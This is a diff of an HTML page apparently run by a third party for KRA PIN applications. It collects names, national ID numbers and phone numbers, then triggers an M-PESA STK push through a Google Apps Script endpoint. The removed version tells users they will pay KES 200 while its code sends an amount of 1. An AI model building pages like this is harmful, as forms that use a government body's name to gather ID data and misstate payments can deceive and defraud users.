@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>KRA Application</title>
+<title>Lost KRA Application</title>
 
 <style>
 body { 
@@ -21,7 +21,6 @@ body {
   box-shadow:0 8px 30px rgba(0,0,0,0.08); 
   border-top:5px solid #10b981; 
 }
-
 .header { text-align:center; margin-bottom:30px; }
 .icon { 
   width:65px; height:65px; background:#10b981; border-radius:50%; 
@@ -31,11 +30,8 @@ body {
 h1 { color:#059669; margin-top:15px; }
 .sub { color:#6b7280; font-size:14px; }
 
-.section { margin-top:25px; }
-.section h3 { border-bottom:2px solid #d1fae5; padding-bottom:8px; color:#374151; }
-
-.grid { display:grid; grid-template-columns:repeat(3,1fr); gap:18px; margin-top:15px; }
-@media(max-width:768px) { .grid { grid-template-columns:1fr; } }
+.grid { display:grid; grid-template-columns:repeat(3,1fr); gap:18px; }
+@media(max-width:768px){ .grid{grid-template-columns:1fr;} }
 
 .field { display:flex; flex-direction:column; }
 label { font-size:13px; font-weight:600; margin-bottom:6px; }
@@ -43,281 +39,207 @@ label { font-size:13px; font-weight:600; margin-bottom:6px; }
 input, select { 
   padding:14px; border-radius:10px; border:1px solid #d1d5db; outline:none; 
 }
-input:focus, select:focus { 
-  border-color:#10b981; box-shadow:0 0 0 3px rgba(16,185,129,0.2); 
-}
 
 button { 
   margin-top:25px; width:100%; padding:15px; background:#10b981; color:white; 
   border:none; border-radius:10px; font-size:16px; cursor:pointer; 
 }
-button:hover { background:#059669; }
-button:disabled { background:#9ca3af; cursor:not-allowed; }
 
 .screen { display:none; }
 .active { display:block; }
 
 #status { margin-top:15px; text-align:center; font-weight:bold; }
 
-/* Spinner */
 .spinner { 
   display:none; width:50px; height:50px; border:5px solid #f3f3f3; 
   border-top:5px solid #10b981; border-radius:50%; animation:spin 1s linear infinite; 
   margin:20px auto; 
 }
-@keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
+@keyframes spin { 100% { transform:rotate(360deg); } }
 
-.mpesa-logo { width:100px; height:100px; margin:20px auto; display:block; }
+/* Consent */
+.consent { margin-top:20px; }
+.checkbox-wrapper{
+  display:flex; gap:10px; font-size:14px; color:#374151; line-height:1.5;
+}
+.checkbox-wrapper input{
+  width:18px; height:18px; accent-color:#10b981;
+}
+.checkbox-wrapper a{
+  color:#10b981; text-decoration:none; font-weight:600;
+}
 
-/* Beautiful Success Modal */
+/* Modal */
 .success-modal {
   position: fixed;
-  top: 0; left: 0; width: 100%; height: 100%;
-  background: rgba(0,0,0,0.7);
-  display: none;
-  align-items: center;
-  justify-content: center;
-  z-index: 1000;
+  top:0; left:0; width:100%; height:100%;
+  background:rgba(0,0,0,0.7);
+  display:none;
+  align-items:center;
+  justify-content:center;
 }
-
 .success-content {
-  background: white;
-  padding: 40px 30px;
-  border-radius: 20px;
-  text-align: center;
-  max-width: 420px;
-  box-shadow: 0 15px 35px rgba(0,0,0,0.2);
-  animation: popUp 0.4s ease;
-}
-
-@keyframes popUp {
-  from { transform: scale(0.7); opacity: 0; }
-  to { transform: scale(1); opacity: 1; }
-}
-
-.success-icon {
-  font-size: 60px;
-  margin-bottom: 20px;
-}
-
-.success-content h2 {
-  color: #10b981;
-  margin: 10px 0 15px;
-}
-
-.success-content p {
-  color: #374151;
-  line-height: 1.6;
-  margin-bottom: 25px;
-}
-
-.close-btn {
-  background: #10b981;
-  color: white;
-  border: none;
-  padding: 12px 30px;
-  border-radius: 10px;
-  font-size: 16px;
-  cursor: pointer;
-}
-
-.close-btn:hover {
-  background: #059669;
+  background:white;
+  padding:30px;
+  border-radius:20px;
+  text-align:center;
 }
 </style>
 </head>
+
 <body>
 
 <div class="container">
 
-  <!-- FORM SCREEN -->
-  <div id="formScreen" class="screen active">
-    <div class="header">
-      <div class="icon">👤</div>
-      <h1>KRA Application Form</h1>
-      <div class="sub">Fill all required fields. We only contact you on 0780003131</div>
-    </div>
-
-    <form id="form">
-      <div class="section">
-        <h3>Personal Information</h3>
-        <div class="grid">
-          <div class="field"><label>Full Names *</label><input name="Full Names" required></div>
-          <div class="field"><label>Phone Number *</label><input name="Phone Number" required></div>
-          <div class="field"><label>Active Email *</label><input type="email" name="Active Email" required></div>
-        </div>
-      </div>
-
-      <div class="section">
-        <h3>Personal Details</h3>
-        <div class="grid">
-          <div class="field"><label>Date of Birth *</label><input type="date" name="Date of Birth" required></div>
-          <div class="field"><label>ID Number *</label><input name="ID Number" required></div>
-          <div class="field"><label>Preferred Delivery *</label>
-            <select name="Preferred Delivery Method" required>
-              <option value="">Select</option>
-              <option>WhatsApp</option>
-              <option>Email</option>
-            </select>
-          </div>
-        </div>
-      </div>
-
-      <div class="section">
-        <h3>Location Details</h3>
-        <div class="grid">
-          <div class="field"><label>County *</label><input name="County" required></div>
-          <div class="field"><label>District *</label><input name="District" required></div>
-          <div class="field"><label>Division *</label><input name="Division" required></div>
-          <div class="field"><label>Town *</label><input name="Town" required></div>
-          <div class="field"><label>P.O. Box *</label><input name="P.O. Box" required></div>
-        </div>
-      </div>
-
-      <div class="consent">
-        <label class="checkbox-wrapper">
-          <input type="checkbox" id="consent" required>
-          <span>
-I confirm that I have read, understood, and agree to the 
-<a href="https://www.onlinecyber.co.ke/data-protection" target="_blank">
-Data Protection & Privacy Policy
-</a> & I consent to the collection & processing of my personal information.
-</span>
-        </label>
-      </div>
-
-      <button type="submit">Proceed to Payment</button>
-    </form>
+<!-- FORM -->
+<div id="formScreen" class="screen active">
+  <div class="header">
+    <div class="icon">👤</div>
+    <h1>KRA Application</h1>
+    <div class="sub">Fill details to proceed</div>
   </div>
 
-  <!-- PAYMENT SCREEN -->
-  <div id="paymentScreen" class="screen">
-    <div class="header">
-      <div class="icon">💳</div>
-      <h1>Complete Payment</h1>
-      <div class="sub">Enter your M-PESA number</div>
+  <form id="form">
+    <div class="grid">
+      <div class="field">
+        <label>Full Names *</label>
+        <input name="Full Names" required>
+      </div>
+
+      <div class="field">
+        <label>ID Number *</label>
+        <input name="ID Number" required>
+      </div>
+
+      <div class="field">
+        <label>Phone Number *</label>
+        <input name="Phone Number" required>
+      </div>
+
+      <div class="field">
+        <label>Delivery Method *</label>
+        <select name="Preferred Delivery Method" required>
+          <option value="">Select</option>
+          <option>WhatsApp</option>
+          <option>Email</option>
+        </select>
+      </div>
     </div>
 
-    <div class="field">
-      <label>M-PESA Number *</label>
-      <input id="mpesa" placeholder="07XXXXXXXX" maxlength="10">
+    <!-- ✅ CONSENT ADDED BACK -->
+    <div class="consent">
+      <label class="checkbox-wrapper">
+        <input type="checkbox" id="consent" required>
+        <span>
+          I confirm that I have read, understood, and agree to the 
+          <a href="https://www.onlinecyber.co.ke/data-protection" target="_blank">
+            Data Protection & Privacy Policy
+          </a> and consent to the collection and processing of my personal information.
+        </span>
+      </label>
     </div>
 
-    <img src="https://upload.wikimedia.org/wikipedia/commons/1/15/M-PESA_LOGO-01.svg" 
-         class="mpesa-logo" alt="M-PESA">
+    <button type="submit">Proceed to Payment</button>
+  </form>
+</div>
 
-    <div id="spinner" class="spinner"></div>
-
-    <button id="payButton" onclick="payNow()">Pay Now - KES 200</button>
-
-    <div id="status"></div>
+<!-- PAYMENT -->
+<div id="paymentScreen" class="screen">
+  <div class="header">
+    <div class="icon">💳</div>
+    <h1>Payment</h1>
   </div>
+
+  <div class="field">
+    <label>M-PESA Number *</label>
+    <input id="mpesa" placeholder="07XXXXXXXX">
+  </div>
+
+  <div id="spinner" class="spinner"></div>
+
+  <button onclick="payNow()">Pay Now</button>
+
+  <div id="status"></div>
+</div>
 
 </div>
 
-<!-- BEAUTIFUL SUCCESS MODAL -->
+<!-- SUCCESS -->
 <div id="successModal" class="success-modal">
   <div class="success-content">
-    <div class="success-icon">✅</div>
-    <h2>Application Submitted Successfully!</h2>
-    <p>Your KRA PIN Registration has been received and is being processed.</p>
-    <p><strong>Please check your phone and enter PIN to complete the M-PESA payment of KES 200.</strong></p>
-    <p style="color:#10b981; font-weight:600;">You will be contacted once your application is fully processed.</p>
-    
-    <button class="close-btn" onclick="closeModal()">Submit Another Application</button>
+    <h2>✅ Success</h2>
+    <p>Check your phone and enter M-PESA PIN</p>
+    <button onclick="location.reload()">Done</button>
   </div>
 </div>
 
 <script>
-// ====================== CONFIG ======================
 const scriptURL = "https://script.google.com/macros/s/AKfycbxukDLNV_aKGSdLaZVGhA6epqE8h7OLPNfCUQDMnJb6I7Lk49Ks3zIeiWJEyrDORF38hg/exec";
 
 let formDataStore = {};
 
-// FORM SUBMISSION
-document.getElementById("form").addEventListener("submit", function(e) {
+// FORM STEP
+document.getElementById("form").addEventListener("submit", function(e){
   e.preventDefault();
-  if (!document.getElementById("consent").checked) {
-    alert("Please agree to the privacy policy.");
+
+  if(!document.getElementById("consent").checked){
+    alert("Please agree to the Data Protection Policy.");
     return;
   }
+
   formDataStore = Object.fromEntries(new FormData(this).entries());
+
   document.getElementById("formScreen").classList.remove("active");
   document.getElementById("paymentScreen").classList.add("active");
 });
 
-// PAYMENT FUNCTION
-async function payNow() {
-  const phoneInput = document.getElementById("mpesa").value.trim();
-  const statusEl = document.getElementById("status");
-  const spinner = document.getElementById("spinner");
-  const payButton = document.getElementById("payButton");
+// PAYMENT
+async function payNow(){
 
-  if (!phoneInput) {
-    statusEl.innerText = "❌ Please enter M-PESA number";
+  let phone = document.getElementById("mpesa").value.trim();
+  const status = document.getElementById("status");
+  const spinner = document.getElementById("spinner");
+
+  if(!phone){
+    status.innerText="Enter M-PESA number";
     return;
   }
 
-  let phone = phoneInput.replace(/\s+|\+|-/g, '');
-  if (phone.startsWith("07") && phone.length === 10) {
+  if(phone.startsWith("07")){
     phone = "254" + phone.substring(1);
   }
 
-  if (phone.length !== 12 || !phone.startsWith("254")) {
-    statusEl.innerText = "❌ Invalid phone number. Use 07XXXXXXXX";
-    return;
-  }
+  spinner.style.display="block";
+  status.innerText="Sending STK Push...";
 
-  payButton.disabled = true;
-  payButton.textContent = "Processing...";
-  spinner.style.display = "block";
-  statusEl.innerText = "⏳ Sending M-PESA STK Push...";
+  try{
 
-  try {
-    const payload = {
-      ...formDataStore,
-      "Phone Number": phone,
-      "M-PESA Number": phone,
-      amount: "1"
-    };
-
-    const response = await fetch(scriptURL, {
-      method: "POST",
-      headers: { "Content-Type": "application/x-www-form-urlencoded" },
-      body: new URLSearchParams(payload)
+    const res = await fetch(scriptURL,{
+      method:"POST",
+      headers:{ "Content-Type":"application/x-www-form-urlencoded" },
+      body:new URLSearchParams({
+        ...formDataStore,
+        "M-PESA Number":phone,
+        "Phone Number":phone,
+        amount:"1"
+      })
     });
 
-    const text = await response.text();
-    let result;
-    try {
-      result = JSON.parse(text);
-    } catch(e) {
-      result = { status: "error", message: "Invalid response" };
-    }
+    const text = await res.text();
+    let result = {};
+    try { result = JSON.parse(text); } catch(e){}
 
-    if (result.status === "success") {
-      // Show Beautiful Modal
-      document.getElementById("successModal").style.display = "flex";
+    if(result.status==="success"){
+      document.getElementById("successModal").style.display="flex";
     } else {
-      statusEl.innerText = `❌ ${result.message || "Failed to send STK"}`;
+      status.innerText="Failed: " + (result.message || "");
     }
 
-  } catch (err) {
-    console.error(err);
-    statusEl.innerText = "❌ Network error. Please try again.";
-  } finally {
-    setTimeout(() => {
-      spinner.style.display = "none";
-      payButton.disabled = false;
-      payButton.textContent = "Pay Now - KES 200";
-    }, 6000);
+  }catch(err){
+    status.innerText="Network error";
   }
-}
 
-// Close Modal and Reset Form
-function closeModal() {
-  document.getElementById("successModal").style.display = "none";
-  location.reload();   // Refresh to start new application
+  spinner.style.display="none";
 }
 </script>
 
